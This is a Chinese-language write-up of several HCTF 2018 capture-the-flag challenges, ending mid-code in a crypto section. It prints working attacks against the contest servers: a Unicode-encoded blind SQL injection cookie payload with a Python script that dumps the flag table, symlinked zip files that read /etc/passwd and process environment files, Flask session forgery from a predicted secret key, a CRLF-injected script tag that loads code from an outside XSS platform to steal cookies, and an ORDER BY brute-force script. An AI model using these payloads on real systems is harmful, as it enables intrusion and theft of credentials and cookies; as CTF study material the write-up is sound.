直接在登录页面想利用SQL注入，发现是有过滤的。</p><p>但是在<code>include/member.php</code>中发现</p><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/img/20181111193529.png"></p><p>也就是说 <code>Cookie</code>中存在SQL注入，且无过滤，有一个<code>json_decode</code>，需要用json方式传入Cookie，然后<code>cookie注入</code></p><p>但是测试<code>union</code>注入和报错注入都不行，应该是只能时间盲注，并且需要利用Unicode绕过，jsondecode可以直接解Unicode。</p><p>payload</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Cookie: islogin&#x3D;1;login_data&#x3D;&#123;&quot;admin_user&quot;:&quot;\u0061\u0064\u006d\u0069\u006e\u0027\u0020\u0061\u006e\u0064\u0020\u0069\u0066\u0028\u0028\u0073\u0075\u0062\u0073\u0074\u0072\u0028\u0028\u0064\u0061\u0074\u0061\u0062\u0061\u0073\u0065\u0028\u0029\u0029\u002c\u0031\u002c\u0031\u0029\u003d\u0027\u0068\u0027\u0029\u002c\u0073\u006c\u0065\u0065\u0070\u0028\u0035\u0029\u002c\u0031\u0029\u0023&quot;,&quot;admin_password&quot;:&quot;123&quot;&#125;</span><br></pre></td></tr></table></figure><p>小脚本写一写：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">unicode</span>(<span class="params">s</span>):</span></span><br><span class="line">    unis = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">        unis += <span class="string">&#x27;\u00&#x27;</span>+i.encode(<span class="string">&quot;hex&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> unis</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://kzone.2018.hctf.io/admin/index.php&quot;</span></span><br><span class="line"></span><br><span class="line">cookies = &#123;</span><br><span class="line">    <span class="string">&quot;islogin&quot;</span>:<span class="string">&quot;1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;login_data&quot;</span>:<span class="string">&#x27;&#123;&quot;admin_user&quot;:&quot;admin&quot;,&quot;admin_pass&quot;:true&#125;&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">dic = string.letters + string.digits + <span class="string">&quot;&#123;&#125;,-_&quot;</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">40</span>):</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> dic:</span><br><span class="line">        <span class="comment">#payload = &quot;admin&#x27; and if((substr((database()),%d,1)=&#x27;%s&#x27;),sleep(5),1)#&quot; %(i,c)</span></span><br><span class="line">        <span class="comment">#payload = &quot;admin&#x27; and if((substr((select binary group_concat(table_name) from information_schema.tables where table_schema=database()),%d,1)=&#x27;%s&#x27;),sleep(5),1)#&quot; % (i,c)</span></span><br><span class="line">        <span class="comment">#payload = &quot;admin&#x27; and if((substr((select binary group_concat(column_name) from information_schema.columns where table_name=&#x27;F1444g&#x27;),%d,1)=&#x27;%s&#x27;),sleep(5),1)#&quot; % (i,c)</span></span><br><span class="line">        payload = <span class="string">&quot;admin&#x27; and if((substr((select binary F1a9 from F1444g),%d,1)=&#x27;%s&#x27;),sleep(5),1)#&quot;</span> % (i,c)</span><br><span class="line">        <span class="comment">#print payload</span></span><br><span class="line">        payload = unicode(payload)</span><br><span class="line">        cookies = &#123;</span><br><span class="line">            <span class="string">&quot;islogin&quot;</span>:<span class="string">&quot;1&quot;</span>,</span><br><span class="line">            <span class="string">&quot;login_data&quot;</span>:<span class="string">&#x27;&#123;&quot;admin_user&quot;:&quot;&#x27;</span>+payload+<span class="string">&#x27;&quot;,&quot;admin_pass&quot;:true&#125;&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        time_start = time.time()</span><br><span class="line">        content = requests.get(url=url,cookies=cookies).content</span><br><span class="line">        time_end = time.time()</span><br><span class="line">        <span class="comment">#print time_end - time_start</span></span><br><span class="line">        <span class="keyword">if</span> time_end - time_start &gt;= <span class="number">5</span>:</span><br><span class="line">            flag += c</span><br><span class="line">            <span class="keyword">print</span> flag</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">DBname:hctfkouzone</span></span><br><span class="line"><span class="string">TBname:F1444g,fish_admin,fish_ip,fish_user,fis</span></span><br><span class="line"><span class="string">Colname:F1a9</span></span><br><span class="line"><span class="string">DumpData:</span></span><br><span class="line"><span class="string">flag:hctf&#123;4526a8cbd741b3f790f95ad32c2514b9&#125;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="admin"><a href="#admin" class="headerlink" title="admin"></a>admin</h2><p>出题人意图不难揣测，以admin身份登录系统就行。</p><p>但是一开始没找到源码，费了很多功夫才在<a href="https://github.com/woadsl1234/hctf_flask">github上找到源码</a></p><p>在<code>app/routes.py</code>里面看到了这个：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.route(&#x27;/register&#x27;, methods = [&#x27;GET&#x27;, &#x27;POST&#x27;])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">register</span>():</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> current_user.is_authenticated:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    form = RegisterForm()</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        name = strlower(form.username.data)<span class="comment"># 第一次strlower()</span></span><br><span class="line">        <span class="keyword">if</span> session.get(<span class="string">&#x27;image&#x27;</span>).lower() != form.verify_code.data.lower():</span><br><span class="line">            flash(<span class="string">&#x27;Wrong verify code.&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&#x27;register.html&#x27;</span>, title = <span class="string">&#x27;register&#x27;</span>, form=form)</span><br><span class="line">            ...</span><br><span class="line"><span class="meta">@app.route(&#x27;/login&#x27;, methods = [&#x27;GET&#x27;, &#x27;POST&#x27;])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span>():</span></span><br><span class="line">    <span class="keyword">if</span> current_user.is_authenticated:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    form = LoginForm()</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        name = strlower(form.username.data)<span class="comment"># 第二次时strlower()</span></span><br><span class="line">        session[<span class="string">&#x27;name&#x27;</span>] = name</span><br><span class="line">        user = User.query.filter_by(username=name).first()</span><br><span class="line">        ...</span><br><span class="line"><span class="meta">@app.route(&#x27;/change&#x27;, methods = [&#x27;GET&#x27;, &#x27;POST&#x27;])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change</span>():</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> current_user.is_authenticated:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line">    form = NewpasswordForm()</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        name = strlower(session[<span class="string">&#x27;name&#x27;</span>])<span class="comment"># 第三次strlower()</span></span><br><span class="line">        user = User.query.filter_by(username=name).first()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>代码中共出现三次<code>strlower</code>函数</p><p>跟进，看看这个函数是怎么写的：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">strlower</span>(<span class="params">username</span>):</span></span><br><span class="line">    username = nodeprep.prepare(username)</span><br><span class="line">    <span class="keyword">return</span> username</span><br></pre></td></tr></table></figure><p>搜索这个函数，找到参考文档</p><p>参考<a href="https://paper.tuisec.win/detail/a9ad1440249d95b">Unicode安全</a></p><blockquote><p>这个函数会把大写转换为小写，把类似的unicode字符做一个与chrome的地址栏里相似的转换，举个例子</p><p><code>BIG</code>会被转换为<code>big</code>, <code>ƁƗƓ</code>会被转换为<code>ɓɨɠ</code></p><p>他们对用户名是否重复的判断是执行一次这个函数然后进行比对 ，例如AAA会被变为aaa则和之前已经注册过的aaa重复 ，但是这里出现了一个错误，注册一个<code>ᴬᴬᴬ</code>，经过函数处理后变成了AAA，因为与aaa不同所以注册成功，而在用户点击重置密码的连接的时候，这个函数再次被执行了一次，AAA变成了aaa，导致用户aaa的密码被越权修改</p></blockquote><p>于是思路也就有了：</p><ol><li>注册<code>ᴬdmin</code></li><li>登录<code>ᴬdmin</code>, 会触发第二次转换，但是因为以<code>ᴬdmin</code>登录，所以会变成<code>Admin</code></li><li>再改密码，会触发第三次的转换<code>Admin</code>会变成<code>admin</code>，所以其实这里修改的是admin的密码</li><li>再以admin的身份登录就行了。</li></ol><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/img/20181111210418.png"></p><h2 id="hideandseek"><a href="#hideandseek" class="headerlink" title="hideandseek"></a>hideandseek</h2><p>思路：</p><ol><li>上传shell的zip，<code>phar://</code>读             发现不行，事实上网站是flask搭建的</li><li>上传软链接的zip，因为会自动unzip，然后可以软链接读文件</li></ol><p>发现思路2可行，并且很容易读文件，如<code>/etc/passwd</code></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ln -si &#x2F;etc&#x2F;passwd link</span><br><span class="line">zip --symlinks test.zip link</span><br></pre></td></tr></table></figure><p>但是在读文件的时候发现了问题，不是在默认的路径<code>/var/www/html/app/*.py</code></p><p>于是尝试读配置文件和log，但是发现环境access.log和error.log读取时发生超时错误</p><p>最终在<code>/proc/self/environ</code>读到了有效信息</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ln -si &#x2F;proc&#x2F;self&#x2F;environ env</span><br><span class="line">zip --symlinks env.zip env</span><br></pre></td></tr></table></figure><blockquote><p>UWSGI_ORIGINAL_PROC_NAME=/usr/local/bin/uwsgiSUPERVISOR_GROUP_NAME=uwsgiHOSTNAME=92739130567fSHLVL=0PYTHON_PIP_VERSION=18.1HOME=/rootGPG_KEY=0D96DF4D4110E5C43FBFB17F2D347EA6AA65421DUWSGI_INI=/app/it_is_hard_t0_guess_the_path_but_y0u_find_it_5f9s5b5s9.iniNGINX_MAX_UPLOAD=0UWSGI_PROCESSES=16STATIC_URL=/staticUWSGI_CHEAPER=2NGINX_VERSION=1.13.12-1<del>stretchPATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binNJS_VERSION=1.13.12.0.2.0-1</del>stretchLANG=C.UTF-8SUPERVISOR_ENABLED=1PYTHON_VERSION=3.6.6NGINX_WORKER_PROCESSES=autoSUPERVISOR_SERVER_URL=unix:///var/run/supervisor.sockSUPERVISOR_PROCESS_NAME=uwsgiLISTEN_PORT=80STATIC_INDEX=0PWD=/app/hard_t0_guess_n9f5a95b5ku9fgSTATIC_PATH=/app/staticPYTHONPATH=/appUWSGI_RELOADS=0</p></blockquote><p>之后又在<code>/app/it_is_hard_t0_guess_the_path_but_y0u_find_it_5f9s5b5s9.ini</code>中读取到</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[uwsgi] module &#x3D; hard_t0_guess_n9f5a95b5ku9fg.hard_t0_guess_also_df45v48ytj9_main callable&#x3D;app</span><br></pre></td></tr></table></figure><p>于是得到结论：源码在<code>/app/hard_t0_guess_n9f5a95b5ku9fg/hard_t0_guess_also_df45v48ytj9_main.py</code></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ln -si &#x2F;app&#x2F;hard_t0_guess_n9f5a95b5ku9fg&#x2F;hard_t0_guess_also_df45v48ytj9_main.py main</span><br><span class="line">zip --symlinks main.zip main</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,session,render_template,redirect, url_for, escape, request,Response</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">from</span> werkzeug.utils <span class="keyword">import</span> secure_filename</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">random.seed(uuid.getnode())</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = str(random.random()*<span class="number">100</span>)</span><br><span class="line">app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>] = <span class="string">&#x27;./uploads&#x27;</span></span><br><span class="line">app.config[<span class="string">&#x27;MAX_CONTENT_LENGTH&#x27;</span>] = <span class="number">100</span> * <span class="number">1024</span></span><br><span class="line">ALLOWED_EXTENSIONS = set([<span class="string">&#x27;zip&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">allowed_file</span>(<span class="params">filename</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;.&#x27;</span> <span class="keyword">in</span> filename <span class="keyword">and</span> \</span><br><span class="line">           filename.rsplit(<span class="string">&#x27;.&#x27;</span>, <span class="number">1</span>)[<span class="number">1</span>].lower() <span class="keyword">in</span> ALLOWED_EXTENSIONS</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(&#x27;/&#x27;, methods=[&#x27;GET&#x27;])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    error = request.args.get(<span class="string">&#x27;error&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span>(error == <span class="string">&#x27;1&#x27;</span>):</span><br><span class="line">        session.pop(<span class="string">&#x27;username&#x27;</span>, <span class="literal">None</span>)</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>, forbidden=<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;username&#x27;</span> <span class="keyword">in</span> session:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>, user=session[<span class="string">&#x27;username&#x27;</span>], flag=flag.flag)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(&#x27;/login&#x27;, methods=[&#x27;POST&#x27;])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span>():</span></span><br><span class="line">    username=request.form[<span class="string">&#x27;username&#x27;</span>]</span><br><span class="line">    password=request.form[<span class="string">&#x27;password&#x27;</span>]</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span> <span class="keyword">and</span> username != <span class="string">&#x27;&#x27;</span> <span class="keyword">and</span> password != <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">        <span class="keyword">if</span>(username == <span class="string">&#x27;admin&#x27;</span>):</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>,error=<span class="number">1</span>))</span><br><span class="line">        session[<span class="string">&#x27;username&#x27;</span>] = username</span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(&#x27;/logout&#x27;, methods=[&#x27;GET&#x27;])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">logout</span>():</span></span><br><span class="line">    session.pop(<span class="string">&#x27;username&#x27;</span>, <span class="literal">None</span>)</span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(&#x27;/upload&#x27;, methods=[&#x27;POST&#x27;])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upload_file</span>():</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;the_file&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> request.files:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line">    file = request.files[<span class="string">&#x27;the_file&#x27;</span>]</span><br><span class="line">    <span class="keyword">if</span> file.filename == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line">    <span class="keyword">if</span> file <span class="keyword">and</span> allowed_file(file.filename):</span><br><span class="line">        filename = secure_filename(file.filename)</span><br><span class="line">        file_save_path = os.path.join(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>], filename)</span><br><span class="line">        <span class="keyword">if</span>(os.path.exists(file_save_path)):</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;This file already exists&#x27;</span></span><br><span class="line">        file.save(file_save_path)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;This file is not a zipfile&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        extract_path = file_save_path + <span class="string">&#x27;_&#x27;</span></span><br><span class="line">        os.system(<span class="string">&#x27;unzip -n &#x27;</span> + file_save_path + <span class="string">&#x27; -d &#x27;</span>+ extract_path)</span><br><span class="line">        read_obj = os.popen(<span class="string">&#x27;cat &#x27;</span> + extract_path + <span class="string">&#x27;/*&#x27;</span>)</span><br><span class="line">        file = read_obj.read()</span><br><span class="line">        read_obj.close()</span><br><span class="line">        os.system(<span class="string">&#x27;rm -rf &#x27;</span> + extract_path)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        file = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    os.remove(file_save_path)</span><br><span class="line">    <span class="keyword">if</span>(file != <span class="literal">None</span>):</span><br><span class="line">        <span class="keyword">if</span>(file.find(base64.b64decode(<span class="string">&#x27;aGN0Zg==&#x27;</span>).decode(<span class="string">&#x27;utf-8&#x27;</span>)) != <span class="number">-1</span>):</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>, error=<span class="number">1</span>))</span><br><span class="line">    <span class="keyword">return</span> Response(file)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment">#app.run(debug=True)</span></span><br><span class="line">    app.run(host=<span class="string">&#x27;127.0.0.1&#x27;</span>, debug=<span class="literal">True</span>, port=<span class="number">10008</span>)</span><br></pre></td></tr></table></figure><p>拿到源码，关键的几行在</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">random.seed(uuid.getnode())</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = str(random.random()*<span class="number">100</span>)</span><br></pre></td></tr></table></figure><p>也就是说<code>SECRET_KEY</code>是利用mac地址作为随机数种子的，是可以预测生成随机数的序列的，但是需要知道python版本号。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ln -s &#x2F;app&#x2F;main.py 1.txt</span><br><span class="line">zip -y 1.zip 1.txt</span><br></pre></td></tr></table></figure><p>读取到相关信息</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from flask import Flask </span><br><span class="line">app &#x3D; Flask(__name__) </span><br><span class="line"></span><br><span class="line">@app.route(&quot;&#x2F;&quot;) </span><br><span class="line">def hello(): </span><br><span class="line">return &quot;Hello World from Flask in a uWSGI Nginx Docker container with \ Python 3.6 (default)&quot; </span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;: </span><br><span class="line">app.run(host&#x3D;&#39;0.0.0.0&#39;, debug&#x3D;True, port&#x3D;80)</span><br></pre></td></tr></table></figure><p>py3.6</p><p>于是可以伪造session</p><p>对于<code>uuid.getnode()</code><br>同样方式读取<code>/sys/class/net/eth0/address</code><br>得到</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">12:34:3e:14:7c:62</span><br></pre></td></tr></table></figure><p>计算十进制：<code>20015589129314</code><br>用python3.6去看一下随机数</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; import random</span><br><span class="line">&gt;&gt;&gt; random.seed(20015589129314)</span><br><span class="line">&gt;&gt;&gt; print(str(random.random()*100))</span><br><span class="line">11.935137566861131</span><br></pre></td></tr></table></figure><p>得到<code>secret_key=11.935137566861131</code></p><p>本地搭建一个环境，用于生成session</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#encoding: utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> *</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = <span class="string">&quot;11.935137566861131&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#登录&amp;注册页面</span></span><br><span class="line"><span class="meta">@app.route(&quot;/&quot;,methods=[&#x27;GET&#x27;,&#x27;POST&#x27;])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span>():</span></span><br><span class="line">    session[<span class="string">&#x27;username&#x27;</span>] = <span class="string">u&#x27;admin&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;aa&#x27;</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">8000</span>)</span><br></pre></td></tr></table></figure><p>得到伪造的session</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">eyJ1c2VybmFtZSI6ImFkbWluIn0.DsqsZg.BfDKFJ-Mb6MqAvozONjnbKlUM4c</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/img/20181112142214.png"></p><h2 id="bottle"><a href="#bottle" class="headerlink" title="bottle"></a>bottle</h2><p>submit url 容易想到CSRF或者SSRF之类的攻击，测试发现有一个302跳转(/path?path=)</p><p>思路还是CSRF+XSS 打cookie</p><p>学习p牛的文章<a href="https://www.leavesongs.com/PENETRATION/bottle-crlf-cve-2016-9964.html">Bottle HTTP 头注入漏洞探究</a></p><p>发现可以通过CRLF挤掉CSP构造xss打回cookie来</p><p>需要设置<code>X-XSS-Protect</code>和<code>Content-Length</code>，但是，后来测试不加似乎也是可以的。。。</p><p>我是使用XSS平台的，payload</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;bottle.2018.hctf.io&#x2F;path?path&#x3D;http:&#x2F;&#x2F;bottle.2018.hctf.io:22&#x2F;user%0d%0aX-XSS-Protection:0%0d%0aContent-Length:300%0d%0a%0d%0a%3Cscript%20src&#x3D;http:&#x2F;&#x2F;xsspt.com&#x2F;XXXXXX%3E%3C&#x2F;script%3E</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;bottle.2018.hctf.io&#x2F;path?path&#x3D;http:&#x2F;&#x2F;bottle.2018.hctf.io:22&#x2F;user%0d%0a%0d%0a%3Cscript%20src&#x3D;http:&#x2F;&#x2F;xsspt.com&#x2F;XXXXXXX%3E%3C&#x2F;script%3E</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/img/20181112171322.png"></p><p>容易得到cookie,将cookie设置一下，再次访问题目链接，得到flag</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bottle.session&#x3D;b0ddffbc22e34e7fb49d460d9512c69c</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/img/20181112182537.png"></p><h2 id="Game"><a href="#Game" class="headerlink" title="Game"></a>Game</h2><p>数据量太大了,加载的时候，我还以为是延时注入成功了==、</p><p>其实本题是考察<code>OrderBy注入</code>，可惜的是，明明还看过OrderBy注入，却没想到==、</p><p>学习了。</p><hr><p>OrderBy注入原理可以参考<a href="https://p0sec.net/index.php/archives/106/">p0神博客</a></p><p>直接打开flag文件，提示说只有admin用户才能打开。</p><p>于是我们可以利用SQL注入来获取admin用户的密码，从而读取flag文件。</p><p>注册新用户，密码逐位逐位与admin的密码比较，最后得到admin的密码，密码这样可以按照密码进行排序，比如注册个密码为d的用户，然后登陆后用password排序</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;game.2018.hctf.io&#x2F;web2&#x2F;user.php?order&#x3D;password</span><br></pre></td></tr></table></figure><p>发现注册的用户在admin上面，说明admin密码第一位<code>password[0] &gt;= &#39;d&#39;</code></p><p>同理，注册密码为e的用户，测试发现注册用户在admin下方，于是admin密码第一位<code>password[0] &lt; &#39;e&#39;</code></p><p>于是可以得到结论  <code>password[0] == &#39;d&#39;</code></p><p>不断注册新用户，便可以逐位爆破出admin密码</p><p>附上脚本：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">reg</span>(<span class="params">username,password</span>):</span></span><br><span class="line">    url = <span class="string">&quot;http://game.2018.hctf.io/web2/action.php?action=reg&quot;</span></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;username&quot;</span>:username,</span><br><span class="line">        <span class="string">&quot;password&quot;</span>:password,</span><br><span class="line">        <span class="string">&quot;sex&quot;</span>:<span class="number">1</span>,</span><br><span class="line">        <span class="string">&quot;submit&quot;</span>:<span class="string">&quot;submit&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    content = requests.post(url=url,data=data).content</span><br><span class="line">    <span class="keyword">print</span> content</span><br><span class="line"></span><br><span class="line">login_url = <span class="string">&quot;http://game.2018.hctf.io/web2/action.php?action=login&quot;</span></span><br><span class="line">ss =  <span class="string">&quot;-/123456789&quot;</span>+string.lowercase</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">32</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">33</span>,<span class="number">126</span>):</span><br><span class="line">        username = <span class="string">&quot;v0w0012112nkakab&quot;</span>+str(i) +<span class="string">&quot;zssugar&quot;</span>+str(j)</span><br><span class="line">        password = flag + chr(j)</span><br><span class="line">        <span class="comment"># print username,password</span></span><br><span class="line">        reg(username,password)</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&quot;username&quot;</span>:username,</span><br><span class="line">            <span class="string">&quot;password&quot;</span>:str(password),</span><br><span class="line">            <span class="string">&quot;submit&quot;</span>:<span class="string">&quot;submit&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment"># print data</span></span><br><span class="line">        req = requests.session()</span><br><span class="line">        content = req.post(url=login_url,data=data).content</span><br><span class="line">        <span class="comment">#print content</span></span><br><span class="line">        order_url = <span class="string">&quot;http://game.2018.hctf.io/web2/user.php?order=password&quot;</span></span><br><span class="line">        content = req.get(url=order_url).content</span><br><span class="line">        <span class="comment">#print content</span></span><br><span class="line">        tmp = re.findall(<span class="string">r&#x27;%s[.\s\S]+?&lt;td&gt;\s*1\s*&lt;/td&gt;\s*&lt;td&gt;\s*admin\s*&lt;/td&gt;&#x27;</span>%username,content,re.S)</span><br><span class="line">        <span class="keyword">if</span> tmp:</span><br><span class="line">            flag = flag + chr(j<span class="number">-1</span>)</span><br><span class="line">            <span class="keyword">print</span> flag</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>最后跑出了密码：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dSa8&amp;&amp;!@#$%^&amp;d1nGy1aS3dja</span><br></pre></td></tr></table></figure><p>然后读取flag</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hctf&#123;this_idea_h1t_me_whil3_I_am_W3rking&#125;</span><br></pre></td></tr></table></figure><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="xor-rsa"><a href="#xor-rsa" class="headerlink" title="xor?rsa"></a>xor?rsa</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nbits &#x3D; size(n)</span><br><span class="line">kbits &#x3D; nbits &#x2F;&#x2F; (2 * e * e)</span><br><span class="line">m1 &#x3D; getRandomNBitInteger(nbits)</span><br><span class="line">m2 &#x3D; m1 ^ getRandomNBitInteger(kbits)</span><br></pre></td></tr></table></figure><p>padding 长度为 nbits/e^2,长度过短 会造成短填充攻击</p><p>可以求得m1-m2的差值diff</p><p>知道c1、c2、diff、e、n可以进行相关信息攻击</p><p>得到m1，m2发送过去即可得到flag。</p><figure class="highlight python"><table><tr><td 